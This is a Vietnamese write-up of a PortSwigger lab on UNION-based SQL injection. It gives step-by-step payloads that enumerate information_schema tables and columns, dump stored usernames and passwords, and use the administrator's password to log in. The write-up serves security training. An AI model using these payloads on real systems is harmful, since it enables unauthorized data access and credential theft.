

**Metadata:**
* **Target:** [PortSwigger Lab: Listing the database contents on non-Oracle databases](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle)
* **Prerequisite Knowledge:** Cần nắm vững kỹ thuật tìm số lượng cột và cột chứa kiểu String ở bài viết [[Methodology_Column&Data_Type_Enumeration]] và Xác định hệ quản trị ở bài viết [[Methodology_Column&Data_Type_Enumeration]]

---

## 1. Objective & Attack Surface (Mục tiêu và Bề mặt tấn công)

* **Mục tiêu bài Lab:** Xác định tên bảng chứa tài khoản, trích xuất thông tin đăng nhập và đăng nhập thành công vào tài khoản `administrator`.
* **Tham số Mục tiêu:** Lỗ hổng nằm ở tính năng lọc sản phẩm qua tham số `category` trên thanh URL:
  `GET /filter?category=Gifts HTTP/1.1`

## 2. The Information Schema (Đặc thù Hệ thống)

Đối với các hệ quản trị cơ sở dữ liệu phi Oracle (như **PostgreSQL**, **MySQL**, **MSSQL**), tiêu chuẩn SQL quy định sự tồn tại của một cơ sở dữ liệu mặc định tên là `information_schema`. Nó hoạt động như một danh bạ lưu trữ siêu dữ liệu (Metadata) về toàn bộ cấu trúc của hệ thống. 

Hai bảng quan trọng nhất để khai thác là:
* `information_schema.tables`: Chứa danh sách tất cả các bảng. Cột cần quan tâm là `table_name`.
* `information_schema.columns`: Chứa thông tin về tất cả các cột. Cột cần quan tâm là `column_name` và `table_name`.

## 3. Payload Crafting & Exploitation (Quy trình Khai thác 4 Bước)

*(Giả định qua Fuzzing, ta đã biết truy vấn gốc trả về **2 cột** và cả hai đều chấp nhận kiểu dữ liệu **String**).*

**Bước 1: Liệt kê danh sách các Bảng (Table Enumeration)**
Ta cần tìm một bảng có tên liên quan đến người dùng (ví dụ: `users`).
* **Payload:** `'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--`
* **Phân tích Response:** Tìm kiếm trong luồng HTML trả về, ta sẽ phát hiện một bảng có tên dạng `users_abcdef` (PortSwigger thường gắn thêm chuỗi ngẫu nhiên để chống đoán mò).

**Bước 2: Liệt kê danh sách các Cột (Column Enumeration)**
Sau khi có tên bảng (`users_abcdef`), ta truy vấn để tìm tên các cột bên trong bảng này.
* **Payload:** `'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_abcdef'--`
* **Phân tích Response:** Tìm kiếm trong kết quả trả về, ta sẽ xác định được 2 cột chứa tài khoản và mật khẩu, có định dạng như `username_ghijkl` và `password_mnopqr`.

**Bước 3: Trích xuất Dữ liệu Đăng nhập (Data Extraction)**
Sử dụng chính xác tên bảng và tên cột vừa thu thập được để dump dữ liệu.
* **Payload:** `'+UNION+SELECT+username_ghijkl,+password_mnopqr+FROM+users_abcdef--`
* **Thực thi vào URL:**
  `https://YOUR-LAB-ID.web-security-academy.net/filter?category=Gifts'+UNION+SELECT+username_ghijkl,+password_mnopqr+FROM+users_abcdef--`
* **Kết quả:** Giao diện trả về danh sách các tài khoản và mật khẩu tương ứng. Hãy ghi lại mật khẩu của tài khoản `administrator`.

**Bước 4: Đăng nhập (Login Bypass via Credentials)**
Sử dụng thông tin `administrator` cùng mật khẩu vừa lấy được để đăng nhập vào form xác thực của hệ thống, qua đó hoàn thành bài Lab.